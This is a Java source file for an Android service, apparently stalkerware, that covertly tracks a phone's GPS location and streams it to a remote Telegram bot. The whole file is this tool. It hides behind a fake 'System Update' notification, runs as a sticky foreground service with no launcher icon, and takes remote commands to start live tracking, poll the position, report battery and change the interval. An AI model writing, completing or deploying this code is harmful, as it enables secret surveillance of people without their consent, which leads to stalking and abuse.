package br.svc.satellite;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import java.util.Locale;

/**
 * SINO-GPS — servico de localizacao oculto com entrega via Telegram.
 * Sem icone de launcher, sem recents, notificacao silenciosa de baixa importancia.
 */
public class SinoGpsService extends Service {

    private static final String CH = "sys_atualizacao";
    private static final int NOTIF_ID = 1001;
    private static final int LIVE_SECONDS = 8 * 3600; // teto de uma sessao ao vivo

    private TelegramBridge tg;
    private GpsEngine gps;
    private Prefs prefs;
    private Handler ui;
    private long liveMsg = 0;
    private long startedAt = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        startedAt = System.currentTimeMillis();
        tg = new TelegramBridge(BuildConfig.BOT_TOKEN, BuildConfig.MASTER_CHAT);
        tg.say("sat create v" + BuildConfig.VERSION_NAME);
        try {
            prefs = new Prefs(this);
            ui = new Handler(Looper.getMainLooper());
            goForeground();
            tg.say("sat fgs ok");

            gps = new GpsEngine(this);
            gps.start(fix -> ui.post(() -> onFix(fix)), prefs.intervalMs(), 20f);

            new Thread(() -> tg.listen((text, from) -> ui.post(() -> onCmd(text))), "sat-tg").start();

            tg.say("sat online");
        } catch (Throwable t) {
            tg.say("sat ERRO create: " + t);
        }
    }

    private boolean wantLive = Boolean.parseBoolean(BuildConfig.AUTO_VAI);

    private void onFix(Location l) {
        if (!wantLive) return;
        if (liveMsg != 0) {
            try {
                tg.moveLive(liveMsg, l.getLatitude(), l.getLongitude());
                return;
            } catch (Exception e) {
                liveMsg = 0; // sessao expirou ou caiu — cai pra baixo e reabre
            }
        }
        try {
            liveMsg = tg.liveLocation(l.getLatitude(), l.getLongitude(), LIVE_SECONDS);
            prefs.liveMsgId(liveMsg);
        } catch (Exception ignored) { }
    }

    private void onCmd(String raw) {
        String[] parts = raw.trim().split("\\s+", 2);
        String cmd = parts[0].toLowerCase(Locale.ROOT);
        String arg = parts.length > 1 ? parts[1].trim() : "";

        // trava: PIN embutido no build (vazio = so chat_id ja basta)
        if (!BuildConfig.PIN.isEmpty()) {
            String[] ap = arg.split("\\s+", 2);
            if (ap.length == 0 || !ap[0].equals(BuildConfig.PIN)) {
                tg.say("comando recusado");
                return;
            }
            arg = ap.length > 1 ? ap[1].trim() : "";
        }

        switch (cmd) {
            case "/vai":
                cmdVai();
                break;
            case "/para":
                cmdPara();
                break;
            case "/agora": {
                Location l = gps.last();
                if (l != null) {
                    try { tg.liveLocation(l.getLatitude(), l.getLongitude(), 60); }
                    catch (Exception ignored) { }
                }
                break;
            }
            case "/status":
                tg.say(statusLine());
                break;
            case "/cada": {
                try {
                    int s = Integer.parseInt(arg);
                    s = Math.max(5, Math.min(s, 3600));
                    prefs.intervalMs(s * 1000L);
                    gps.setInterval(s * 1000L);
                    tg.say("intervalo " + s + "s");
                } catch (Exception e) { tg.say("uso: /cada <segundos>"); }
                break;
            }
            default:
                tg.say("comandos: /vai /para /agora /status /cada N");
        }
    }

    private void cmdVai() {
        Location l = gps.last();
        if (l == null) { tg.say("sem fix ainda — aguardando satelite"); return; }
        wantLive = true;
        try {
            liveMsg = tg.liveLocation(l.getLatitude(), l.getLongitude(), LIVE_SECONDS);
            prefs.liveMsgId(liveMsg);
            tg.say("sessao aberta · pin ao vivo ativo");
        } catch (Exception e) {
            tg.say("falha ao abrir sessao");
        }
    }

    private void cmdPara() {
        if (liveMsg != 0) {
            try { tg.stopLive(liveMsg); } catch (Exception ignored) { }
            liveMsg = 0;
            prefs.liveMsgId(0);
        }
        wantLive = false;
        tg.say("sessao encerrada");
    }

    private String statusLine() {
        Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int bat = -1;
        if (bi != null) bat = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        Location l = gps.last();
        String fix = l != null
                ? String.format(Locale.US, "%.5f,%.5f ±%.0fm", l.getLatitude(), l.getLongitude(), l.getAccuracy())
                : "sem fix";
        long upMin = (System.currentTimeMillis() - startedAt) / 60_000L;
        return String.format(Locale.US, "bateria %d%% · %s · intervalo %ds · uptime %dmin",
                bat, fix, prefs.intervalMs() / 1000, upMin);
    }

    private void goForeground() {
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CH, "atualizacao do sistema",
                    NotificationManager.IMPORTANCE_LOW); // silenciosa, sem badge ruidoso
            ch.setDescription("");
            nm.createNotificationChannel(ch);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, CH)
                : new Notification.Builder(this);
        b.setContentTitle("Atualização do Sistema")
         .setContentText("Verificando atualizações…")
         .setSmallIcon(android.R.drawable.stat_sys_download_done)
         .setOngoing(true)
         .setShowWhen(false);
        if (Build.VERSION.SDK_INT >= 31) b.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
        startForeground(NOTIF_ID, b.build());
    }

    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        if (tg != null) tg.stop();
        super.onDestroy();
    }
}
